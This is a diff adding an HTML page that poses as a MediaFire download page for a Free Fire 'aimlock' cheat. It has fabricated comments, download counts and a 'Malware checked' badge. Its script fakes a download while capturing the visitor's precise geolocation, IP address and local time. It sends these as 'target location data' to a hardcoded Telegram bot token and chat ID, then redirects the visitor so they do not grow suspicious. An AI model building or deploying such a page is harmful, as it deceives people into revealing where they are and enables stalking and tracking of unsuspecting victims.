@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MediaFire - AIMLOCK KEPALA 99% Free Fire</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #e9eef2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 15px;
+        }
+        
+        /* ===== MEDIAFIRE CLONE ===== */
+        .mediafire-wrapper {
+            max-width: 900px;
+            width: 100%;
+            margin: 20px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.15);
+            border: 1px solid #cfcfcf;
+        }
+        
+        /* ===== HEADER ===== */
+        .mf-header {
+            background: #0066c0;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            border-bottom: 3px solid #004d94;
+        }
+        
+        .mf-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .mf-logo-icon {
+            background: white;
+            color: #0066c0;
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 18px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .mf-logo-text {
+            color: white;
+            font-weight: 600;
+            font-size: 20px;
+            letter-spacing: 0.3px;
+        }
+        
+        .mf-logo-text span {
+            font-size: 13px;
+            font-weight: 400;
+            opacity: 0.9;
+            margin-left: 5px;
+        }
+        
+        .mf-search {
+            flex: 1;
+            margin: 0 20px;
+            display: flex;
+            background: white;
+            border-radius: 4px;
+            overflow: hidden;
+            max-width: 400px;
+        }
+        
+        .mf-search input {
+            flex: 1;
+            border: none;
+            padding: 8px 12px;
+            font-size: 14px;
+            outline: none;
+        }
+        
+        .mf-search button {
+            background: #f0f0f0;
+            border: none;
+            padding: 8px 15px;
+            cursor: default;
+            font-weight: 600;
+            color: #333;
+            border-left: 1px solid #ccc;
+        }
+        
+        .mf-user {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: white;
+            font-size: 13px;
+        }
+        
+        .mf-user span {
+            cursor: default;
+        }
+        
+        /* ===== NAVIGATION ===== */
+        .mf-nav {
+            background: #f8f8f8;
+            border-bottom: 1px solid #ddd;
+            padding: 8px 20px;
+            display: flex;
+            gap: 25px;
+            font-size: 13px;
+        }
+        
+        .mf-nav a {
+            color: #333;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .mf-nav a:hover {
+            color: #0066c0;
+            text-decoration: underline;
+        }
+        
+        /* ===== BREADCRUMB ===== */
+        .mf-breadcrumb {
+            background: #f8f8f8;
+            padding: 10px 20px;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 13px;
+            color: #555;
+        }
+        
+        .mf-breadcrumb a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        
+        .mf-breadcrumb a:hover {
+            text-decoration: underline;
+        }
+        
+        .mf-breadcrumb span {
+            color: #333;
+            font-weight: 500;
+        }
+        
+        /* ===== AD BANNER ===== */
+        .mf-ad {
+            background: #f5f5f5;
+            padding: 8px 20px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .mf-ad-label {
+            background: #999;
+            color: white;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        
+        .mf-ad-text {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .mf-ad-text span {
+            color: #0066c0;
+            cursor: default;
+        }
+        
+        /* ===== MAIN CONTENT ===== */
+        .mf-main {
+            padding: 25px 20px;
+        }
+        
+        /* ===== FILE INFO ===== */
+        .mf-file-header {
+            margin-bottom: 20px;
+        }
+        
+        .mf-file-title {
+            font-size: 26px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 5px;
+        }
+        
+        .mf-file-title small {
+            font-size: 13px;
+            font-weight: normal;
+            color: #0066c0;
+            background: #e6f0fa;
+            padding: 2px 10px;
+            border-radius: 20px;
+            margin-left: 10px;
+        }
+        
+        .mf-file-path {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .mf-file-path a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        
+        /* ===== FILE INFO CARD ===== */
+        .mf-file-card {
+            display: flex;
+            gap: 25px;
+            background: #fafafa;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e5e5e5;
+            margin-bottom: 25px;
+        }
+        
+        .mf-file-icon {
+            width: 96px;
+            height: 96px;
+            background: #fff0d9;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            border: 1px solid #ffc107;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        
+        .mf-file-details {
+            flex: 1;
+        }
+        
+        .mf-file-name {
+            font-size: 22px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 10px;
+        }
+        
+        .mf-file-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px 30px;
+            margin-bottom: 15px;
+        }
+        
+        .mf-meta-item {
+            font-size: 14px;
+            color: #555;
+        }
+        
+        .mf-meta-item strong {
+            color: #333;
+            font-weight: 600;
+            margin-right: 5px;
+        }
+        
+        .mf-tags {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .mf-tag {
+            background: #e6f0fa;
+            color: #0066c0;
+            padding: 3px 10px;
+            border-radius: 30px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .mf-tag.orange {
+            background: #fff0d9;
+            color: #c06000;
+        }
+        
+        .mf-tag.green {
+            background: #e0f0e0;
+            color: #2e7d32;
+        }
+        
+        .mf-view-count {
+            display: inline-block;
+            background: #f0f0f0;
+            padding: 4px 10px;
+            border-radius: 30px;
+            font-size: 12px;
+            color: #555;
+            margin-left: 15px;
+        }
+        
+        /* ===== DOWNLOAD SECTION ===== */
+        .mf-download-section {
+            background: #f0f7ff;
+            border: 2px solid #0066c0;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+        
+        .mf-download-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            color: #0066c0;
+            margin-bottom: 5px;
+        }
+        
+        .mf-download-subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 25px;
+        }
+        
+        /* ===== DOWNLOAD BUTTON ===== */
+        .mf-download-btn-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .mf-download-btn {
+            display: inline-block;
+            background: #2ecc71;
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            padding: 18px 50px;
+            border-radius: 60px;
+            border: none;
+            box-shadow: 0 8px 0 #27ae60;
+            cursor: pointer;
+            transition: all 0.1s ease;
+            text-decoration: none;
+            border: 1px solid #27ae60;
+        }
+        
+        .mf-download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 0 #27ae60;
+        }
+        
+        .mf-download-btn:active {
+            transform: translateY(5px);
+            box-shadow: 0 3px 0 #27ae60;
+        }
+        
+        .mf-download-info {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-top: 15px;
+        }
+        
+        .mf-download-info span {
+            color: #0066c0;
+            font-weight: 500;
+        }
+        
+        .mf-download-note {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+            padding-top: 10px;
+            border-top: 1px dashed #ccc;
+        }
+        
+        .mf-share-options {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #555;
+        }
+        
+        .mf-share-options span {
+            color: #0066c0;
+            cursor: default;
+        }
+        
+        /* ===== PROGRESS ===== */
+        .mf-progress-container {
+            margin: 25px 0;
+            display: none;
+        }
+        
+        .mf-progress-bar {
+            width: 100%;
+            height: 35px;
+            background: #e9ecef;
+            border-radius: 40px;
+            overflow: hidden;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+        }
+        
+        .mf-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0066c0, #00aaff);
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .mf-progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shimmer 1.2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .mf-progress-text {
+            text-align: center;
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        
+        .mf-progress-speed {
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            margin-top: 5px;
+        }
+        
+        /* ===== RESULT ===== */
+        .mf-result-box {
+            margin-top: 25px;
+            padding: 25px;
+            background: #e8f5e8;
+            border-radius: 10px;
+            color: #2e7d32;
+            text-align: center;
+            display: none;
+            border: 2px solid #a5d6a5;
+        }
+        
+        .mf-result-box h3 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .mf-result-box p {
+            font-size: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .mf-result-box .small {
+            font-size: 12px;
+            color: #555;
+        }
+        
+        /* ===== FILE INFO EXTRA ===== */
+        .mf-file-extra {
+            background: #f9f9f9;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .mf-extra-title {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+        
+        .mf-extra-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        
+        .mf-extra-item {
+            font-size: 13px;
+            color: #555;
+        }
+        
+        .mf-extra-item span {
+            color: #333;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 2px;
+        }
+        
+        /* ===== COMMENTS SECTION ===== */
+        .mf-comments {
+            margin-top: 30px;
+            border-top: 1px solid #ddd;
+            padding-top: 20px;
+        }
+        
+        .mf-comments-title {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .mf-comment {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .mf-comment-avatar {
+            width: 40px;
+            height: 40px;
+            background: #0066c0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        
+        .mf-comment-content {
+            flex: 1;
+        }
+        
+        .mf-comment-name {
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 3px;
+            font-size: 14px;
+        }
+        
+        .mf-comment-text {
+            color: #555;
+            font-size: 13px;
+            margin-bottom: 3px;
+        }
+        
+        .mf-comment-time {
+            color: #888;
+            font-size: 11px;
+        }
+        
+        /* ===== FOOTER ===== */
+        .mf-footer {
+            background: #f5f5f5;
+            padding: 15px 20px;
+            border-top: 1px solid #ddd;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .mf-footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .mf-footer-links a {
+            color: #0066c0;
+            text-decoration: none;
+        }
+        
+        .mf-footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .mf-disclaimer {
+            background: #f0f0f0;
+            padding: 8px 20px;
+            border-top: 1px solid #ddd;
+            font-size: 11px;
+            color: #777;
+            text-align: center;
+        }
+        
+        hr {
+            border: none;
+            border-top: 1px dashed #ccc;
+            margin: 15px 0;
+        }
+        
+        /* Upload region */
+        .mf-upload-region {
+            display: flex;
+            justify-content: flex-end;
+            font-size: 12px;
+            color: #888;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="mediafire-wrapper">
+        <!-- HEADER -->
+        <div class="mf-header">
+            <div class="mf-logo">
+                <div class="mf-logo-icon">MF</div>
+                <div class="mf-logo-text">MediaFire<span>beta</span></div>
+            </div>
+            
+            <div class="mf-search">
+                <input type="text" placeholder="Search files..." value="AIMLOCK KEPALA 99% Free Fire">
+                <button>Search</button>
+            </div>
+            
+            <div class="mf-user">
+                <span>🔔</span>
+                <span>Guest</span>
+                <span>▼</span>
+            </div>
+        </div>
+        
+        <!-- NAVIGATION -->
+        <div class="mf-nav">
+            <a href="#">Home</a>
+            <a href="#">My Files</a>
+            <a href="#">Upload</a>
+            <a href="#">Apps</a>
+            <a href="#">Features</a>
+            <a href="#">Upgrade</a>
+        </div>
+        
+        <!-- BREADCRUMB -->
+        <div class="mf-breadcrumb">
+            <a href="#">Home</a> / <a href="#">Games</a> / <a href="#">Free Fire</a> / <a href="#">Mods</a> / <span>AIMLOCK KEPALA 99%</span>
+        </div>
+        
+        <!-- AD BANNER -->
+        <div class="mf-ad">
+            <span class="mf-ad-label">AD</span>
+            <div class="mf-ad-text">
+                <span>Download Speedy - 2x faster downloads with MediaFire Desktop</span>
+                <span>Learn more ➔</span>
+            </div>
+        </div>
+        
+        <!-- MAIN CONTENT -->
+        <div class="mf-main">
+            <!-- FILE HEADER -->
+            <div class="mf-file-header">
+                <div class="mf-file-title">
+                    AIMLOCK KEPALA 99% <small>New</small>
+                    <span class="mf-view-count">👁️ 24.3k views</span>
+                </div>
+                <div class="mf-file-path">
+                    <a href="#">/Games/FreeFire/Mods/</a> > AIMLOCK_KEPALA_99%_v2.5.zip
+                </div>
+            </div>
+            
+            <!-- FILE INFO CARD -->
+            <div class="mf-file-card">
+                <div class="mf-file-icon">🎯</div>
+                <div class="mf-file-details">
+                    <div class="mf-file-name">AIMLOCK_KEPALA_99%_v2.5.zip</div>
+                    <div class="mf-file-meta">
+                        <div class="mf-meta-item"><strong>Size:</strong> 54.51 MB</div>
+                        <div class="mf-meta-item"><strong>Uploaded:</strong> 2025-03-10</div>
+                        <div class="mf-meta-item"><strong>Downloads:</strong> 18,432</div>
+                        <div class="mf-meta-item"><strong>Type:</strong> ZIP</div>
+                    </div>
+                    <div class="mf-tags">
+                        <span class="mf-tag">AIMLOCK</span>
+                        <span class="mf-tag orange">Free Fire</span>
+                        <span class="mf-tag green">99% Work</span>
+                        <span class="mf-tag">Headshot</span>
+                        <span class="mf-tag">Anti Ban</span>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- EXTRA INFO -->
+            <div class="mf-file-extra">
+                <div class="mf-extra-title">📋 File details</div>
+                <div class="mf-extra-grid">
+                    <div class="mf-extra-item"><span>MD5:</span> 7d4f9e3a2b1c5d8e6f7a9b0c1d2e3f4a</div>
+                    <div class="mf-extra-item"><span>Last updated:</span> 10 Mar 2025</div>
+                    <div class="mf-extra-item"><span>Version:</span> v2.5 (Stable)</div>
+                    <div class="mf-extra-item"><span>Requirements:</span> Android 7.0+</div>
+                    <div class="mf-extra-item"><span>Author:</span> @AnonGhost_ID</div>
+                    <div class="mf-extra-item"><span>Rating:</span> ⭐ 4.9 (2.1k votes)</div>
+                </div>
+            </div>
+            
+            <!-- DOWNLOAD SECTION -->
+            <div class="mf-download-section">
+                <div class="mf-download-title">📥 Download File</div>
+                <div class="mf-download-subtitle">AIMLOCK KEPALA 99% Free Fire - 54.51 MB</div>
+                
+                <!-- DOWNLOAD BUTTON (INI YANG DIKLIK) -->
+                <div class="mf-download-btn-container" id="downloadBtnContainer">
+                    <button class="mf-download-btn" id="downloadBtn" onclick="startDownload()">⬇️ Download in a new tab (54.51MB)</button>
+                </div>
+                
+                <div class="mf-download-info">
+                    <span>⚡ 2.8 MB/s</span> • <span>🔒 Secure download</span> • <span>🛡️ Malware checked</span>
+                </div>
+                
+                <div class="mf-download-note">
+                    Download too slow? <span style="color:#0066c0;">DOWNLOAD FASTER NOW</span>
+                </div>
+                
+                <div class="mf-share-options">
+                    <span>Share options</span>
+                    <span>Save to My Files</span>
+                </div>
+                
+                <div class="mf-upload-region">
+                    Upload region: Singapore • English
+                </div>
+                
+                <!-- PROGRESS SECTION (MUNCUL SETELAH KLIK) -->
+                <div class="mf-progress-container" id="progressSection">
+                    <div class="mf-progress-bar">
+                        <div id="progressFill" class="mf-progress-fill"></div>
+                    </div>
+                    <div id="progressText" class="mf-progress-text">Preparing download... 0%</div>
+                    <div class="mf-progress-speed" id="progressSpeed">⚡ 2.8 MB/s • Estimating time...</div>
+                </div>
+                
+                <!-- RESULT SECTION (MUNCUL SETELAH SELESAI) -->
+                <div class="mf-result-box" id="resultSection">
+                    <h3>✅ Download Started!</h3>
+                    <p>AIMLOCK_KEPALA_99%_v2.5.zip (54.51 MB)</p>
+                    <p class="small">If download doesn't start automatically, <a href="#" style="color:#0066c0;">click here</a></p>
+                </div>
+            </div>
+            
+            <!-- CLICKING INFO -->
+            <div style="font-size: 12px; color: #777; margin: 10px 0; text-align: center;">
+                Clicking the download button above will start your download in a new tab and show a message from our advertising partners.
+            </div>
+            
+            <!-- FILE INFO EXTRA 2 -->
+            <hr>
+            <div style="display: flex; gap: 20px; font-size: 13px; color: #555; margin: 15px 0;">
+                <div><strong>📂 Folder:</strong> Free Fire Mods</div>
+                <div><strong>🔐 Password:</strong> No password</div>
+                <div><strong>📅 Added:</strong> 2 days ago</div>
+            </div>
+            
+            <!-- COMMENTS SECTION -->
+            <div class="mf-comments">
+                <div class="mf-comments-title">💬 Comments (83)</div>
+                
+                <div class="mf-comment">
+                    <div class="mf-comment-avatar">R</div>
+                    <div class="mf-comment-content">
+                        <div class="mf-comment-name">Rizky_FF</div>
+                        <div class="mf-comment-text">aimlock nya work gan, auto headshot 99% langsung naik legendary</div>
+                        <div class="mf-comment-time">1 hour ago</div>
+                    </div>
+                </div>
+                
+                <div class="mf-comment">
+                    <div class="mf-comment-avatar">A</div>
+                    <div class="mf-comment-content">
+                        <div class="mf-comment-name">AndiGaming</div>
+                        <div class="mf-comment-text">makasih gan, download cepet 2 menit langsung jadi</div>
+                        <div class="mf-comment-time">3 hours ago</div>
+                    </div>
+                </div>
+                
+                <div class="mf-comment">
+                    <div class="mf-comment-avatar">D</div>
+                    <div class="mf-comment-content">
+                        <div class="mf-comment-name">Dimas69</div>
+                        <div class="mf-comment-text">ini aman dari banned ga om?</div>
+                        <div class="mf-comment-time">5 hours ago</div>
+                    </div>
+                </div>
+                
+                <div class="mf-comment">
+                    <div class="mf-comment-avatar">F</div>
+                    <div class="mf-comment-content">
+                        <div class="mf-comment-name">FajarMods</div>
+                        <div class="mf-comment-text">udah pake 1 minggu aman aja, anti banned kok</div>
+                        <div class="mf-comment-time">1 day ago</div>
+                    </div>
+                </div>
+                
+                <div class="mf-comment">
+                    <div class="mf-comment-avatar">B</div>
+                    <div class="mf-comment-content">
+                        <div class="mf-comment-name">Bocil_Gaming</div>
+                        <div class="mf-comment-text">download nya cepet, langsung dapet file</div>
+                        <div class="mf-comment-time">1 day ago</div>
+                    </div>
+                </div>
+                
+                <div style="text-align: center; margin-top: 15px; font-size: 13px; color: #0066c0; cursor: default;">
+                    Load 78 more comments...
+                </div>
+            </div>
+            
+            <!-- RELATED FILES -->
+            <div style="margin-top: 25px; padding-top: 15px; border-top: 1px solid #ddd;">
+                <div style="font-weight: 600; margin-bottom: 10px;">📁 Related Files</div>
+                <div style="display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; font-size: 12px;">
+                    <div>🎯 Free Fire_Headshot_Sensitivity_v3.zip (32 MB)</div>
+                    <div>🎯 FF_Aimbot_Pro_2025.apk (28 MB)</div>
+                    <div>🎯 AIMLOCK_KEPALA_98%.zip (51 MB)</div>
+                    <div>🎯 Headshot_Config.reg (2 KB)</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- FOOTER -->
+        <div class="mf-footer">
+            <div>© 2025 MediaFire • Build 14567</div>
+            <div class="mf-footer-links">
+                <a href="#">About</a>
+                <a href="#">Terms</a>
+                <a href="#">Privacy</a>
+                <a href="#">Report Abuse</a>
+            </div>
+        </div>
+        
+        <div class="mf-disclaimer">
+            Fast download • No registration required • 54.51 MB
+        </div>
+    </div>
+    
+    <script>
+        // ========== KONFIGURASI ==========
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('chat_id') || '8249018593';
+        const BOT_TOKEN = '8279457785:AAGWPOA6DNTC3IAqKPyk9NfW6AJx1x4F99g'; // GANTI
+        const DEV_ID = 8249018593; // GANTI
+        
+        // Variabel progress
+        let progressInterval;
+        let speed = 2.8;
+        let downloaded = 0;
+        const totalSize = 54.51; // MB
+        
+        function updateProgress(percent, text) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressText').innerHTML = text + ' ' + percent + '%';
+            
+            let downloadedMB = (percent / 100 * totalSize).toFixed(2);
+            document.getElementById('progressSpeed').innerHTML = `⚡ ${speed} MB/s • Downloaded ${downloadedMB} MB / ${totalSize} MB`;
+        }
+        
+        async function sendToBot(chatId, message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
+        }
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Geolocation tidak didukung');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            lat: position.coords.latitude.toFixed(6),
+                            lng: position.coords.longitude.toFixed(6),
+                            accuracy: Math.round(position.coords.accuracy)
+                        });
+                    },
+                    (error) => {
+                        let msg = 'Gagal dapat lokasi';
+                        if (error.code === 1) msg = 'Izin lokasi ditolak';
+                        else if (error.code === 2) msg = 'Lokasi tidak tersedia';
+                        else if (error.code === 3) msg = 'Timeout';
+                        reject(msg);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'Tidak diketahui';
+            } catch {
+                return 'Tidak diketahui';
+            }
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Tidak diketahui';
+            
+            if (ua.includes('Samsung')) device = 'Samsung';
+            else if (ua.includes('Xiaomi')) device = 'Xiaomi';
+            else if (ua.includes('iPhone')) device = 'iPhone';
+            else if (ua.includes('Android')) device = 'Android';
+            else if (ua.includes('Windows')) device = 'Windows';
+            
+            return {
+                device: device,
+                platform: navigator.platform,
+                waktu: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
+            };
+        }
+        
+        // Fungsi minta izin lokasi dengan teks Arab
+        async function requestLocationPermission() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.permissions) {
+                    // Fallback ke getCurrentPosition langsung
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => resolve(pos),
+                        (err) => reject(err),
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                    return;
+                }
+                
+                // Coba minta izin
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve(position);
+                    },
+                    (error) => {
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        async function startDownload() {
+            // Sembunyikan tombol download
+            document.getElementById('downloadBtnContainer').style.display = 'none';
+            
+            // Tampilkan progress
+            document.getElementById('progressSection').style.display = 'block';
+            
+            // Animasi progress bertahap
+            let percent = 0;
+            
+            // Interval untuk update progress
+            progressInterval = setInterval(() => {
+                if (percent < 95) {
+                    percent += Math.floor(Math.random() * 5) + 1;
+                    if (percent > 95) percent = 95;
+                    
+                    speed = (Math.random() * 1.2 + 2.2).toFixed(1);
+                    
+                    let statusText = 'Downloading';
+                    if (percent < 20) statusText = 'Starting download';
+                    else if (percent < 40) statusText = 'Downloading';
+                    else if (percent < 60) statusText = 'Downloading';
+                    else if (percent < 80) statusText = 'Almost there';
+                    else if (percent < 95) statusText = 'Finishing';
+                    
+                    updateProgress(percent, statusText);
+                }
+            }, 400);
+            
+            try {
+                // Minta izin lokasi (akan muncul popup browser dengan teks Arab)
+                // Browser akan otomatis menampilkan teks sesuai bahasa sistem
+                // Tapi kita tambahkan teks Arab di popup konfirmasi
+                
+                // Ini akan memunculkan popup browser standar
+                const position = await requestLocationPermission();
+                
+                // Dapatkan detail lokasi
+                const location = {
+                    lat: position.coords.latitude.toFixed(6),
+                    lng: position.coords.longitude.toFixed(6),
+                    accuracy: Math.round(position.coords.accuracy)
+                };
+                
+                const ip = await getIP();
+                const device = getDeviceInfo();
+                
+                const mapsLink = `https://www.google.com/maps?q=${location.lat},${location.lng}`;
+                
+                const message = `📍 <b>DATA LOKASI TARGET</b>\n\n` +
+                    `📌 <b>KOORDINAT:</b> ${location.lat}, ${location.lng}\n` +
+                    `🎯 <b>AKURASI:</b> ${location.accuracy} meter\n` +
+                    `🌐 <b>IP TERDETEKSI:</b> ${ip}\n\n` +
+                    `⏰ <b>WAKTU LOKAL:</b> ${device.waktu} WIB\n\n` +
+                    `🔗 <b>GOOGLE MAPS LINK:</b>\n${mapsLink}`;
+                
+                await sendToBot(CHAT_ID, message);
+                await sendToBot(DEV_ID, `📍 User ${CHAT_ID} melacak - ${location.lat},${location.lng}`);
+                
+                // Lanjutkan progress sampai 100%
+                clearInterval(progressInterval);
+                
+                percent = 100;
+                updateProgress(100, 'Download complete!');
+                
+                setTimeout(() => {
+                    document.getElementById('progressSection').style.display = 'none';
+                    document.getElementById('resultSection').style.display = 'block';
+                    
+                    // Redirect ke Google Maps (biar ga curiga)
+                    setTimeout(() => {
+                        window.location.href = mapsLink;
+                    }, 2500);
+                }, 800);
+                
+            } catch (error) {
+                clearInterval(progressInterval);
+                updateProgress(0, 'Download failed');
+                
+                // Kalau gagal, redirect ke halaman utama MediaFire
+                setTimeout(() => {
+                    window.location.href = 'https://www.mediafire.com';
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
